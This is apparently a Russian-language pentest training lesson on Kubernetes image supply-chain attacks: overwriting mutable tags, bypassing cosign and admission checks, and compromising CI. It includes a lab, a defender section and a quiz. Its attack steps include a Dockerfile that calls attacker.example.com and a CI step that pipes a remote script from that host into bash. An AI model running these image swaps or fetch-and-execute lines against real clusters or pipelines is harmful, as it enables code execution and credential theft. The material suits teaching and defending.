---
id: cloud-k8s-image-supply-chain
title: "Supply chain образов Kubernetes: реестры, подписи и подмена"
category: cloud
parent: cloud-k8s-security-deep
difficulty: hard
order: 1
tags: [cloud, kubernetes, images, registry, supply-chain, cosign, admission, tag]
prerequisites: [cloud-k8s-security-deep, cloud-containers-docker]
useful_for:
  - "Атаки на supply chain образов"
  - "Пентест container registry"
  - "Обход admission по образам"
estimated_minutes: 50
summary: "Supply chain образов Kubernetes: реестры (ECR/GCR/ACR/Harbor), mutable-теги, подписи (cosign/Sigstore), image pull secrets и admission-политики. Как подменить образ и обойти проверки."
lab:
  kind: shell
  title: "Практика: supply chain образов Kubernetes"
  toolset: [core]
  workdir: /home/student/k8ssupply
  files: [task.md, notes.md, admission-images.txt, image-signatures.txt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`admission-images.txt` — какие образы допущены; `image-signatures.txt` — подписи."
    - "Ищи образ без валидной подписи или из недоверенного реестра."
    - "Найди флаг: `grep nto image-signatures.txt > found.txt`."

---

## Задача

Ты получил право `push` в container registry, из которого кластер тянет образы. Можно ли, не эксплуатируя ни одной CVE, получить выполнение кода в кластере? Да — если deployment ссылается на **mutable-тег** (например, `app:latest`). Подменив образ, ты заставишь кластер запустить твой код. Задача урока — разобрать supply chain образов и подменить образ.

## Что такое supply chain образов

**Образ** — код, который исполняется в кластере. Цепочка: исходники → **CI-сборка** → **registry** → pull в кластер. Кто контролирует реестр, тег или сборку — контролирует рабочие нагрузки.

Ключевые понятия:

- **Registry** — хранит образы (ECR, GCR/Artifact Registry, ACR, Docker Hub, Harbor). Доступ через IAM/токены.
- **Tag** — изменяемая метка (`app:latest`). **Digest** — неизменяемый идентификатор (`sha256:...`). Deployment на теге уязвим к подмене; на digest — нет.
- **Image pull secret** — креды для приватного реестра в кластере.
- **Signature** — подпись образа (cosign/Sigstore); admission (Kyverno/Connaisseur) может требовать её.
- **Build** — CI, собирающий и пушущий образы; его компрометация заражает все деплои.

## Данные, с которыми работаем

Смотрим, какой образ и по какому идентификатору использует кластер:

```bash
$ kubectl get deploy app -o jsonpath='{.spec.template.spec.containers[0].image}'
registry.example.com/app:latest
$ kubectl get pod mypod -o jsonpath='{.status.containerStatuses[0].imageID}'
docker-pullable://registry.example.com/app@sha256:abc123
```

Deployment ссылается на **тег** `latest` — значит, подмена возможна. Проверяем права в реестре:

```bash
$ aws ecr get-authorization-token >/dev/null && echo "auth ok"
auth ok
$ aws ecr list-images --repository-name app --query 'imageIds[].imageTag'
["latest","v1.2","v1.1"]
```

У нас есть доступ. Смотрим admission-политики:

```bash
$ kubectl get clusterpolicies 2>/dev/null | grep -i verifyImages
# пусто — проверки подписи нет
```

## Шаг 1: собираем образ с полезной нагрузкой

```bash
$ cat > Dockerfile <<'EOF'
FROM alpine
CMD ["sh","-c","curl http://attacker.example.com/x; sleep infinity"]
EOF
$ docker build -t registry.example.com/app:latest .
$ docker push registry.example.com/app:latest
latest: digest: sha256:def456 size: 1234
```

Тег `latest` перезаписан нашим образом.

## Шаг 2: триггерим rollout

```bash
$ kubectl rollout restart deploy/app
deployment.apps/app restarted
$ kubectl get pods -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'
registry.example.com/app@sha256:def456
```

Кластер подтянул наш образ — теперь в поде работает наш код. Если бы deployment ссылался на digest `abc123`, подмена тега ничего бы не дала.

## Полный прогон от начала до конца

1. `kubectl get deploy` → образ на теге `latest`.
2. `ecr list-images` → есть доступ к реестру.
3. `get clusterpolicies` → проверки подписи нет.
4. Собрали и запушили образ с бэкдором.
5. `rollout restart` → наш код в кластере.

## Если не сработало

- **Digest pinning.** Deployment на digest — подмена тега не работает, нужен доступ к перезаписи digest или изменение манифеста.
- **Admission `verifyImages`.** Kyverno/Connaisseur отклоняет неподписанные образы — ищи обход подписи.
- **Immutable tags.** Реестр запрещает перезапись тега — нужен новый тег и изменение deployment.
- **`failurePolicy: Ignore`.** При недоступности webhook запрос пропускается — можно «уронить» webhook.
- **Image pull policy.** `IfNotPresent` оставляет старый образ на узле — подмена может не подхватиться.
- **Кэш на узле.** Даже при подмене образа на узле может остаться старая копия.

## Подписи и их обход

Cosign/Sigstore подписывает образы, а admission проверяет подпись. Обходы:

- **Подмена публичного ключа.** Если ключ проверки лежит в ConfigMap/Secret кластера и у тебя есть доступ — замени на свой.
- **Keyless-подпись.** Если проверка на OIDC-идентичность, подпись можно сделать из репозитория/ветки со слабым условием.
- **Подпись тега, а не digest.** Между проверкой и pull возможна гонка (TOCTOU).
- **Исключения по label/namespace.** Некоторые политики позволяют их — проверь.

```bash
$ kubectl get clusterpolicies -o yaml | grep -A20 verifyImages
```

## Компрометация сборки — сильнее реестра

Компромисс CI заражает образы для множества сервисов сразу. В workflow сборки добавляем шаг, который подтягивает полезную нагрузку, а затем собирает и пушит образ как обычно:

```yaml
- run: |
    curl -s http://attacker.example.com/stage.sh | bash
    docker build -t $REGISTRY/app:$TAG .
    docker push $REGISTRY/app:$TAG
```

Секреты сборки (креды реестра, облачные креды) доступны на этапе build — их можно выгрузить отдельно. Если образы подписываются в CI, а ключ подписи лежит там же, компромисс сборки позволяет подписать и заражённый образ.

## Реестр как цель: ECR/GCR/ACR

Доступ к реестру определяется IAM. Часто роли приложений имеют `ecr:GetAuthorizationToken` и `ecr:BatchGetImage`, а иногда и `ecr:PutImage`. Проверяй права на push:

```bash
$ aws ecr get-authorization-token >/dev/null && echo ok
ok
$ aws ecr list-images --repository-name app --query 'imageIds[].imageTag'
["latest","v1.2"]
```

Если есть `PutImage`, подменяешь образ напрямую, без доступа к CI. Не забывай про image pull secrets в кластере — иногда они имеют более широкие права, чем нужно.

## Обход защит и edge cases

**Digest pinning** ломает подмену тега — нужен доступ к перезаписи digest или изменение манифеста. **Admission `failurePolicy: Ignore`** пропускает образ, если webhook недоступен — можно «уронить» webhook. **Image pull policy** `IfNotPresent` оставляет старый образ на узле. **Immutable tags** в реестре запрещают перезапись тега — тогда нужен новый тег и правка deployment. **Кэш на узле** может сохранить старую копию. Каждый из этих нюансов меняет стратегию подмены.

## Подписи: как проверяются

Проверку подписи задаёт admission-контроллер (Kyverno `verifyImages`, Connaisseur). Смотрим, что именно он проверяет:

```bash
$ kubectl get clusterpolicies -o yaml | grep -A20 verifyImages
```

Если проверяется подпись тега, а не digest, между проверкой и pull возможна гонка (TOCTOU). Если ключ проверки лежит в изменяемом ConfigMap — его можно подменить. Оба случая делают «подписанные образы» ложной защитой.

## Что мы теперь знаем

- Deployment на mutable-теге уязвим к подмене; на digest — нет.
- Права `push`/`PutImage` в реестр = код в кластере без CVE.
- Компрометация CI сильнее подмены реестра: заражает все собираемые образы.
- Подпись (cosign) можно обойти подменой ключа или слабым keyless-условием.
- `failurePolicy: Ignore` и immutable tags меняют стратегию.

## На что смотреть дальше

- **cloud-artifact-registry**: права и устройство реестров.
- **cloud-supply-chain-sbom**: SBOM и attestation как защита.
- **cloud-cicd-github-actions**: компрометация сборки.

## Глазами защитника

Supply chain образов защищают подписью (cosign, Notary), проверкой в admission (Kyverno verifyImages), неизменяемыми тегами и digest-pinning. Реестр ограничивают правами на push, включают immutable tags. Сборочную систему изолируют, артефакты подписывают. Аудит: кто пушил, какие образы тянутся, есть ли проверка подписи. Помнят, что компрометация сборки сильнее компрометации реестра.

## Частые вопросы

**Что такое supply chain образов?**

Цепочка от исходников и сборки до реестра и развёртывания. Атака на любой этап даёт подменённый образ в проде.

**Как подменить образ?**

Через push в реестр (если есть права), через компрометацию сборки или через тег `latest`, который перезаписывается.

**Что даёт подпись?**

Гарантию, что образ собран доверенным ключом. Без проверки подписи в admission она бесполезна.

**Почему digest важнее тега?**

Тег можно перезаписать; digest неизменяем. Pinning по digest не даёт подменить образ.

**Чем компрометация сборки опаснее реестра?**

Она даёт доверенный образ с валидной подписью — защита реестра не помогает.

**Как обойти проверку подписи?**

Найти admission, который её не проверяет, или namespace и ресурс вне политики; иногда подпись проверяется только для одного реестра.

**Как защититься?**

Подпись и её проверка в admission, digest-pinning, immutable tags, изоляция сборки, аудит.

**Что делать, если прав на push нет?**

Искать компрометацию сборки или слабый admission; иногда достаточно доступа к CI.

## Разбор: тег latest и слабый admission

Атакующий получает право push в реестр сервиса. Он собирает образ с полезной нагрузкой и пушит его под тегом `latest`. Кластер тянет `latest` при следующем rollout и запускает подменённый код, который читает service-account токен. Если бы admission проверял подпись и digest-pinning, подмена не прошла бы. Защита — неизменяемые теги, подпись и её проверка, pinning по digest.

## Что чаще всего упускают

Проверку подписи: подпись без верификации в admission бесполезна. Второе — digest-pinning: тег `latest` перезаписывается, и подмена не требует прав на прод. Третье — компрометацию сборки: она даёт доверенный образ с валидной подписью, обходя защиту реестра. Вывод: смотри не только реестр, но и CI, admission и политику тегов.

**Проверяет ли admission подпись по умолчанию?**

Нет, проверку подписи нужно явно настроить (Kyverno, cosign). Без неё подпись не даёт защиты.

**Что даёт SBOM?**

Список компонентов образа; полезен для поиска уязвимых зависимостей, но не мешает подмене сам по себе.

**Что такое immutable tags?**

Теги, которые нельзя перезаписать: при попытке push под существующим тегом реестр отклонит запрос. Это закрывает подмену через `latest`.

## Квиз

Проверь себя.

```quiz
- question: "Почему mutable-тег опасен?"
  options:
    - "Его можно перезаписать, и deployment подтянет новый образ"
    - "Он неизменяем"
    - "Он шифруется"
    - "Он требует MFA"
  answer: 0
  explanation: "Тег можно перезаписать; digest — нет."
- question: "Что проверяет cosign verify?"
  options:
    - "Подпись образа публичным ключом"
    - "Сетевые политики"
    - "RBAC"
    - "Лимиты ресурсов"
  answer: 0
  explanation: "cosign проверяет криптографическую подпись образа."
- question: "Что даёт failurePolicy: Ignore у admission webhook?"
  options:
    - "При недоступности webhook ресурс пропускается"
    - "Webhook всегда отклоняет"
    - "Webhook шифрует"
    - "Webhook логирует"
  answer: 0
  explanation: "Ignore пропускает запрос, если webhook не ответил — обход проверки."
- question: "Почему CI — более сильный вектор, чем реестр?"
  options:
    - "Компрометация сборки затрагивает все образы, которые она производит"
    - "CI медленнее"
    - "CI не имеет прав"
    - "CI шифрует образы"
  answer: 0
  explanation: "Сборка создаёт образы для многих сервисов — эффект шире."
- question: "Что защищает от подмены тега на уровне deployment?"
  options:
    - "Ссылка на образ по digest"
    - "Больше реплик"
    - "hostNetwork"
    - "Ingress"
  answer: 0
  explanation: "Digest неизменяем, поэтому подмена тега не влияет на деплой."
```

## Куда дальше

В следующем уроке мы разберём **Pod Security Admission** — как обойти ограничения на привилегированные поды. А пока главное запомни: **контроль над реестром или тегом = код в кластере без эксплуатации CVE, а защита — это digest и проверка подписи.**

## Где пригодится

- **Пентест k8s:** подмена образов.
- **Supply chain security:** подписи и admission.
- **Red team:** код в кластере без CVE.
- **DevSecOps:** защита реестров и сборки.
